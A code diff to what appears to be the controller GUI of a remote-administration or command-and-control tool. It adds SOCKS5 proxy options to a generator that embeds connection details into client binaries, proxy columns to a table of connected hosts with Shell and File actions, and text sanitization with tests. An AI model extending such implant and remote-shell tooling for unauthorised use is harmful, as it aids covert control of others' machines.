@@ -3,9 +3,10 @@ use controller::*;
 use eframe::egui::{self};
 use egui_extras::{Column, Size, StripBuilder, TableBuilder};
 use heroinn_util::{
-    ConnectionInfo,
+    ConnectionInfo, Socks5ProxyConfig,
     dna::{find_client_template, replace_connection_info_to_new_file},
     ftp::method::transfer_speed,
+    packet::ProxyDisplay,
     *,
 };
 use std::path::PathBuf;
@@ -18,6 +19,92 @@ enum SwitchDock {
     Hosts,
     Listener,
     Generator,
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    fn display(protocol: &str, address: &str) -> ProxyDisplay {
+        ProxyDisplay {
+            protocol: protocol.to_string(),
+            address: address.to_string(),
+            source: Some("system".to_string()),
+        }
+    }
+
+    #[test]
+    fn proxy_columns_are_immediately_before_remark() {
+        let remark = HOST_COLUMN_TITLES
+            .iter()
+            .position(|title| *title == "Remark")
+            .unwrap();
+        assert_eq!(HOST_COLUMN_TITLES[remark - 2], "System Proxy");
+        assert_eq!(HOST_COLUMN_TITLES[remark - 1], "SOCKS5 Proxy");
+    }
+
+    #[test]
+    fn proxy_cells_are_plain_bounded_text() {
+        let unsafe_text = display("HTTP\nInjected", "proxy.example:8080\u{0}hidden");
+        let system = system_proxy_cell_text(Some(&unsafe_text));
+        assert!(!system.contains('\n'));
+        assert!(!system.contains('\u{0}'));
+        assert_eq!(system_proxy_cell_text(None), "None");
+        assert_eq!(socks5_proxy_cell_text(None), "Disabled");
+
+        let long = "x".repeat(MAX_PROXY_CELL_CHARS * 2);
+        assert_eq!(
+            sanitize_ui_text(&long).chars().count(),
+            MAX_PROXY_CELL_CHARS
+        );
+    }
+
+    #[test]
+    fn all_client_reported_text_is_plain_and_bounded() {
+        let unsafe_text = "name\nwith\u{0}controls".repeat(MAX_PROXY_CELL_CHARS);
+        let sanitized = sanitize_ui_text(&unsafe_text);
+        assert!(!sanitized.contains('\n'));
+        assert!(!sanitized.contains('\u{0}'));
+        assert_eq!(sanitized.chars().count(), MAX_PROXY_CELL_CHARS);
+    }
+
+    #[test]
+    fn generator_rejects_udp_and_partial_authentication() {
+        assert_eq!(
+            socks5_from_generator_fields(
+                &HeroinnProtocol::UDP,
+                true,
+                "proxy.example",
+                "1080",
+                "user",
+                "password",
+            )
+            .unwrap(),
+            None
+        );
+        assert!(
+            socks5_from_generator_fields(
+                &HeroinnProtocol::HTTP,
+                true,
+                "proxy.example",
+                "1080",
+                "user",
+                "",
+            )
+            .is_err()
+        );
+        let proxy = socks5_from_generator_fields(
+            &HeroinnProtocol::TCP,
+            true,
+            "[::1]",
+            "1080",
+            "user",
+            "password",
+        )
+        .unwrap()
+        .unwrap();
+        assert_eq!(proxy.authority(), "[::1]:1080");
+    }
 }
 
 struct TransferRateDialog {
@@ -139,6 +226,11 @@ struct HeroinnApp {
     text_generator_port: String,
     text_generator_address: String,
     text_generator_remark: String,
+    use_socks5_proxy: bool,
+    text_socks5_host: String,
+    text_socks5_port: String,
+    text_socks5_username: String,
+    text_socks5_password: String,
     combox_generator_protocol: HeroinnProtocol,
     combox_generator_platform: HeroinnPlatform,
     host_image: Option<egui::TextureHandle>,
@@ -157,12 +249,91 @@ impl Default for HeroinnApp {
             text_generator_port: String::new(),
             text_generator_address: String::new(),
             text_generator_remark: String::new(),
+            use_socks5_proxy: false,
+            text_socks5_host: String::new(),
+            text_socks5_port: String::new(),
+            text_socks5_username: String::new(),
+            text_socks5_password: String::new(),
             combox_generator_protocol: HeroinnProtocol::TCP,
             combox_generator_platform: HeroinnPlatform::WindowsX64,
             host_image: None,
             listener_image: None,
             transfer_rate_dialog: None,
         }
+    }
+}
+
+const HOST_TABLE_MIN_WIDTH: f32 = 1500.0;
+const HOST_COLUMN_TITLES: [&str; 11] = [
+    "",
+    "Peer IP",
+    "Whoami",
+    "Host Name",
+    "OS",
+    "Protocol",
+    "Transfer Rate",
+    "Last Heartbeat",
+    "System Proxy",
+    "SOCKS5 Proxy",
+    "Remark",
+];
+const MAX_PROXY_CELL_CHARS: usize = 96;
+
+fn sanitize_ui_text(input: &str) -> String {
+    input
+        .chars()
+        .map(|character| {
+            if character.is_control() {
+                ' '
+            } else {
+                character
+            }
+        })
+        .take(MAX_PROXY_CELL_CHARS)
+        .collect()
+}
+
+fn proxy_cell_text(display: Option<&ProxyDisplay>, absent: &str) -> String {
+    let Some(display) = display else {
+        return absent.to_string();
+    };
+    let protocol = sanitize_ui_text(&display.protocol);
+    let address = sanitize_ui_text(&display.address);
+    if address.is_empty() {
+        protocol
+    } else {
+        format!("{protocol} {address}")
+    }
+}
+
+fn system_proxy_cell_text(display: Option<&ProxyDisplay>) -> String {
+    proxy_cell_text(display, "None")
+}
+
+fn socks5_proxy_cell_text(display: Option<&ProxyDisplay>) -> String {
+    proxy_cell_text(display, "Disabled")
+}
+
+fn socks5_from_generator_fields(
+    protocol: &HeroinnProtocol,
+    enabled: bool,
+    host: &str,
+    port: &str,
+    username: &str,
+    password: &str,
+) -> Result<Option<Socks5ProxyConfig>> {
+    if !enabled || matches!(protocol, HeroinnProtocol::UDP) {
+        return Ok(None);
+    }
+    let port = port.trim().parse::<u16>().map_err(|_| {
+        heroinn_util::Error::Other(
+            "SOCKS5 proxy port must be an integer between 1 and 65535".to_string(),
+        )
+    })?;
+    if username.is_empty() && password.is_empty() {
+        Socks5ProxyConfig::new(host, port).map(Some)
+    } else {
+        Socks5ProxyConfig::with_auth(host, port, username, password).map(Some)
     }
 }
 
@@ -331,11 +502,16 @@ impl HeroinnApp {
                     .size(Size::exact(15.0))
                     .vertical(|mut strip| {
                         strip.cell(|ui| {
-                            egui::Grid::new("my_grid")
-                                .num_columns(2)
-                                .spacing([300.0, 10.0])
-                                .striped(true)
+                            egui::ScrollArea::vertical()
+                                .id_salt("generator_fields_scroll")
+                                .auto_shrink([false, false])
+                                .max_height((ui.available_height() - 70.0).max(100.0))
                                 .show(ui, |ui| {
+                                    egui::Grid::new("my_grid")
+                                        .num_columns(2)
+                                        .spacing([300.0, 10.0])
+                                        .striped(true)
+                                        .show(ui, |ui| {
                                     ui.add(doc_link_label("Address", "label,heading"));
                                     ui.add(
                                         egui::TextEdit::singleline(
@@ -378,6 +554,80 @@ impl HeroinnApp {
                                         });
                                     ui.end_row();
 
+                                    if matches!(
+                                        self.combox_generator_protocol,
+                                        HeroinnProtocol::UDP
+                                    ) {
+                                        self.use_socks5_proxy = false;
+                                        self.text_socks5_host.clear();
+                                        self.text_socks5_port.clear();
+                                        self.text_socks5_username.clear();
+                                        self.text_socks5_password.clear();
+                                    } else {
+                                        ui.add(doc_link_label(
+                                            "Use SOCKS5 proxy",
+                                            "label,heading",
+                                        ));
+                                        ui.checkbox(&mut self.use_socks5_proxy, "");
+                                        ui.end_row();
+
+                                        ui.add(doc_link_label("SOCKS5 Host", "label,heading"));
+                                        ui.add_enabled(
+                                            self.use_socks5_proxy,
+                                            egui::TextEdit::singleline(
+                                                &mut self.text_socks5_host,
+                                            )
+                                            .hint_text("proxy.example or [::1]"),
+                                        );
+                                        ui.end_row();
+
+                                        ui.add(doc_link_label("SOCKS5 Port", "label,heading"));
+                                        ui.add_enabled(
+                                            self.use_socks5_proxy,
+                                            egui::TextEdit::singleline(
+                                                &mut self.text_socks5_port,
+                                            )
+                                            .hint_text("1080"),
+                                        );
+                                        ui.end_row();
+
+                                        ui.add(doc_link_label(
+                                            "SOCKS5 Username",
+                                            "label,heading",
+                                        ));
+                                        ui.add_enabled(
+                                            self.use_socks5_proxy,
+                                            egui::TextEdit::singleline(
+                                                &mut self.text_socks5_username,
+                                            )
+                                            .hint_text("optional"),
+                                        );
+                                        ui.end_row();
+
+                                        ui.add(doc_link_label(
+                                            "SOCKS5 Password",
+                                            "label,heading",
+                                        ));
+                                        ui.add_enabled(
+                                            self.use_socks5_proxy,
+                                            egui::TextEdit::singleline(
+                                                &mut self.text_socks5_password,
+                                            )
+                                            .password(true)
+                                            .hint_text("optional"),
+                                        );
+                                        ui.end_row();
+
+                                        if self.use_socks5_proxy {
+                                            ui.label("Credential warning:");
+                                            ui.colored_label(
+                                                egui::Color32::YELLOW,
+                                                "SOCKS5 credentials are embedded in the generated client binary and may be extracted.",
+                                            );
+                                            ui.end_row();
+                                        }
+                                    }
+
                                     ui.add(doc_link_label("Platform", "label,heading"));
                                     egui::ComboBox::from_id_salt(2)
                                         .width(280.0)
@@ -414,22 +664,41 @@ impl HeroinnApp {
                                         egui::TextEdit::singleline(&mut self.text_generator_remark)
                                             .hint_text("default"),
                                     );
-                                    ui.end_row();
+                                            ui.end_row();
+                                        });
                                 });
                             ui.separator();
 
                             StripBuilder::new(ui)
                                 .size(Size::exact(570.0))
-                                .size(Size::exact(60.0))
+                                .size(Size::exact(160.0))
                                 .horizontal(|mut strip| {
                                     strip.cell(|_ui| {});
                                     strip.cell(|ui| {
                                         if ui.button("Generate").clicked() {
-                                            let connection_info = match ConnectionInfo::new(
+                                            let socks5_proxy = match socks5_from_generator_fields(
+                                                &self.combox_generator_protocol,
+                                                self.use_socks5_proxy,
+                                                &self.text_socks5_host,
+                                                &self.text_socks5_port,
+                                                &self.text_socks5_username,
+                                                &self.text_socks5_password,
+                                            ) {
+                                                Ok(proxy) => proxy,
+                                                Err(e) => {
+                                                    msgbox::error(
+                                                        &"Generator".to_string(),
+                                                        &format!("{}", e),
+                                                    );
+                                                    return;
+                                                }
+                                            };
+                                            let connection_info = match ConnectionInfo::new_with_socks5(
                                                 self.combox_generator_protocol.clone(),
                                                 &self.text_generator_address,
                                                 &self.text_generator_port,
                                                 &self.text_generator_remark,
+                                                socks5_proxy,
                                             ) {
                                                 Ok(info) => info,
                                                 Err(e) => {
@@ -575,158 +844,160 @@ impl HeroinnApp {
     fn host_table(&mut self, ui: &mut egui::Ui) {
         let rate_dialog_request = std::cell::RefCell::new(None::<String>);
 
-        TableBuilder::new(ui)
-            .striped(true)
-            // egui >= 0.20 no longer upgrades a hover-only response to a clickable
-            // one inside `context_menu`, so the cells must sense clicks themselves
-            // for the per-row context menu to open.
-            .sense(egui::Sense::click())
-            .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
-            .column(Column::initial(50.0).at_least(50.0))
-            .column(Column::initial(160.0).at_least(50.0))
-            .column(Column::initial(110.0).at_least(50.0))
-            .column(Column::initial(150.0).at_least(50.0))
-            .column(Column::initial(220.0).at_least(50.0))
-            .column(Column::initial(140.0).at_least(50.0))
-            .column(Column::initial(130.0).at_least(50.0))
-            .column(Column::initial(150.0).at_least(50.0))
-            .column(Column::initial(150.0).at_least(50.0))
-            .resizable(self.resizable)
-            .header(20.0, |mut header| {
-                header.col(|ui| {
-                    ui.heading("");
-                });
-                header.col(|ui| {
-                    ui.heading("Peer IP");
-                });
-                header.col(|ui| {
-                    ui.heading("Whoami");
-                });
-                header.col(|ui| {
-                    ui.heading("Host Name");
-                });
-                header.col(|ui| {
-                    ui.heading("OS");
-                });
-                header.col(|ui| {
-                    ui.heading("Protocol");
-                });
-                header.col(|ui| {
-                    ui.heading("Transfer Rate");
-                });
-                header.col(|ui| {
-                    ui.heading("Last Heartbeat");
-                });
-                header.col(|ui| {
-                    ui.heading("Remark");
-                });
-            })
-            .body(|mut body| {
-                for info in all_host() {
-                    let clientid = info.clientid.clone();
-
-                    let menu = |ui: &mut egui::Ui| {
-                        if ui.button("Shell").clicked() {
-                            let clientid = clientid.clone();
-                            std::thread::spawn(move || {
-                                if let Err(e) = open_shell(&clientid) {
-                                    msgbox::error(&"Shell".to_string(), &format!("{}", e));
-                                }
+        egui::ScrollArea::horizontal()
+            .auto_shrink([false, false])
+            .show(ui, |ui| {
+                ui.set_min_width(HOST_TABLE_MIN_WIDTH);
+                TableBuilder::new(ui)
+                    .striped(true)
+                    // egui >= 0.20 no longer upgrades a hover-only response to a clickable
+                    // one inside `context_menu`, so the cells must sense clicks themselves
+                    // for the per-row context menu to open.
+                    .sense(egui::Sense::click())
+                    .cell_layout(egui::Layout::left_to_right(egui::Align::Center))
+                    .column(Column::initial(48.0).at_least(48.0))
+                    .column(Column::initial(145.0).at_least(90.0))
+                    .column(Column::initial(100.0).at_least(70.0))
+                    .column(Column::initial(135.0).at_least(90.0))
+                    .column(Column::initial(180.0).at_least(100.0))
+                    .column(Column::initial(85.0).at_least(70.0))
+                    .column(Column::initial(105.0).at_least(80.0))
+                    .column(Column::initial(115.0).at_least(90.0))
+                    .column(Column::initial(170.0).at_least(130.0))
+                    .column(Column::initial(170.0).at_least(130.0))
+                    .column(Column::initial(180.0).at_least(120.0))
+                    .resizable(self.resizable)
+                    .header(20.0, |mut header| {
+                        for title in HOST_COLUMN_TITLES {
+                            header.col(|ui| {
+                                ui.heading(title);
                             });
-                            ui.close();
                         }
-                        if ui.button("File").clicked() {
-                            match open_ftp(&clientid) {
-                                Ok(_) => {}
-                                Err(e) => {
-                                    msgbox::error(&"Shell".to_string(), &format!("{}", e));
+                    })
+                    .body(|mut body| {
+                        for info in all_host() {
+                            let clientid = info.clientid.clone();
+
+                            let menu = |ui: &mut egui::Ui| {
+                                if ui.button("Shell").clicked() {
+                                    let clientid = clientid.clone();
+                                    std::thread::spawn(move || {
+                                        if let Err(e) = open_shell(&clientid) {
+                                            msgbox::error(&"Shell".to_string(), &format!("{}", e));
+                                        }
+                                    });
+                                    ui.close();
+                                }
+                                if ui.button("File").clicked() {
+                                    match open_ftp(&clientid) {
+                                        Ok(_) => {}
+                                        Err(e) => {
+                                            msgbox::error(&"Shell".to_string(), &format!("{}", e));
+                                        }
+                                    };
+                                    ui.close();
+                                }
+                                let rate_requested = std::cell::Cell::new(false);
+                                ui.menu_button("Setting", |ui| {
+                                    if ui.button("Set Tranfer Rate").clicked() {
+                                        *rate_dialog_request.borrow_mut() = Some(clientid.clone());
+                                        rate_requested.set(true);
+                                    }
+                                });
+                                if rate_requested.get() {
+                                    ui.close();
                                 }
                             };
-                            ui.close();
+
+                            let row_height = 30.0;
+                            body.row(row_height, |mut row| {
+                                row.col(|ui| {
+                                    if let Some(tex) = &self.host_image {
+                                        ui.add(egui::Image::from_texture(
+                                            egui::load::SizedTexture::new(
+                                                tex.id(),
+                                                egui::Vec2::new(30.0, 30.0),
+                                            ),
+                                        ));
+                                    }
+                                })
+                                .1
+                                .context_menu(menu);
+
+                                row.col(|ui| {
+                                    ui.label(sanitize_ui_text(&format!("{}", info.peer_addr)));
+                                })
+                                .1
+                                .context_menu(menu);
+
+                                row.col(|ui| {
+                                    ui.label(sanitize_ui_text(&info.info.whoami));
+                                })
+                                .1
+                                .context_menu(menu);
+                                row.col(|ui| {
+                                    ui.label(sanitize_ui_text(&info.info.host_name));
+                                })
+                                .1
+                                .context_menu(menu);
+                                row.col(|ui| {
+                                    ui.label(sanitize_ui_text(&info.info.os));
+                                })
+                                .1
+                                .context_menu(menu);
+                                row.col(|ui| {
+                                    ui.label(format!("{:?}", info.proto));
+                                })
+                                .1
+                                .context_menu(menu);
+
+                                row.col(|ui| {
+                                    let secs = cur_timestamp_secs() - info.last_heartbeat;
+                                    let window = (secs + HEART_BEAT_TIME) as f64;
+                                    let in_rate = info.in_rate as f64 / window;
+                                    let out_rate = info.out_rate as f64 / window;
+                                    ui.label(transfer_speed(in_rate + out_rate)).on_hover_text(
+                                        format!(
+                                            "In {} / Out {}",
+                                            transfer_speed(in_rate),
+                                            transfer_speed(out_rate)
+                                        ),
+                                    );
+                                })
+                                .1
+                                .context_menu(menu);
+
+                                row.col(|ui| {
+                                    let secs = cur_timestamp_secs() - info.last_heartbeat;
+                                    if secs > 30 {
+                                        remove_host(info.clientid);
+                                    }
+                                    ui.label(format!("{} s", secs));
+                                })
+                                .1
+                                .context_menu(menu);
+                                row.col(|ui| {
+                                    ui.label(system_proxy_cell_text(
+                                        info.info.system_proxy.as_ref(),
+                                    ));
+                                })
+                                .1
+                                .context_menu(menu);
+                                row.col(|ui| {
+                                    ui.label(socks5_proxy_cell_text(
+                                        info.info.socks5_proxy.as_ref(),
+                                    ));
+                                })
+                                .1
+                                .context_menu(menu);
+                                row.col(|ui| {
+                                    ui.label(sanitize_ui_text(&info.info.remark));
+                                })
+                                .1
+                                .context_menu(menu);
+                            });
                         }
-                        let rate_requested = std::cell::Cell::new(false);
-                        ui.menu_button("Setting", |ui| {
-                            if ui.button("Set Tranfer Rate").clicked() {
-                                *rate_dialog_request.borrow_mut() = Some(clientid.clone());
-                                rate_requested.set(true);
-                            }
-                        });
-                        if rate_requested.get() {
-                            ui.close();
-                        }
-                    };
-
-                    let row_height = 30.0;
-                    body.row(row_height, |mut row| {
-                        row.col(|ui| {
-                            if let Some(tex) = &self.host_image {
-                                ui.add(egui::Image::from_texture(egui::load::SizedTexture::new(
-                                    tex.id(),
-                                    egui::Vec2::new(30.0, 30.0),
-                                )));
-                            }
-                        })
-                        .1
-                        .context_menu(menu);
-
-                        row.col(|ui| {
-                            ui.label(format!("{}", info.peer_addr));
-                        })
-                        .1
-                        .context_menu(menu);
-
-                        row.col(|ui| {
-                            ui.label(info.info.whoami);
-                        })
-                        .1
-                        .context_menu(menu);
-                        row.col(|ui| {
-                            ui.label(info.info.host_name);
-                        })
-                        .1
-                        .context_menu(menu);
-                        row.col(|ui| {
-                            ui.label(info.info.os);
-                        })
-                        .1
-                        .context_menu(menu);
-                        row.col(|ui| {
-                            ui.label(format!("{:?}", info.proto));
-                        })
-                        .1
-                        .context_menu(menu);
-
-                        row.col(|ui| {
-                            let secs = cur_timestamp_secs() - info.last_heartbeat;
-                            let window = (secs + HEART_BEAT_TIME) as f64;
-                            let in_rate = info.in_rate as f64 / window;
-                            let out_rate = info.out_rate as f64 / window;
-                            ui.label(transfer_speed(in_rate + out_rate))
-                                .on_hover_text(format!(
-                                    "In {} / Out {}",
-                                    transfer_speed(in_rate),
-                                    transfer_speed(out_rate)
-                                ));
-                        })
-                        .1
-                        .context_menu(menu);
-
-                        row.col(|ui| {
-                            let secs = cur_timestamp_secs() - info.last_heartbeat;
-                            if secs > 30 {
-                                remove_host(info.clientid);
-                            }
-                            ui.label(format!("{} s", secs));
-                        })
-                        .1
-                        .context_menu(menu);
-                        row.col(|ui| {
-                            ui.label(info.info.remark);
-                        })
-                        .1
-                        .context_menu(menu);
                     });
-                }
             });
 
         if let Some(clientid) = rate_dialog_request.borrow_mut().take() {
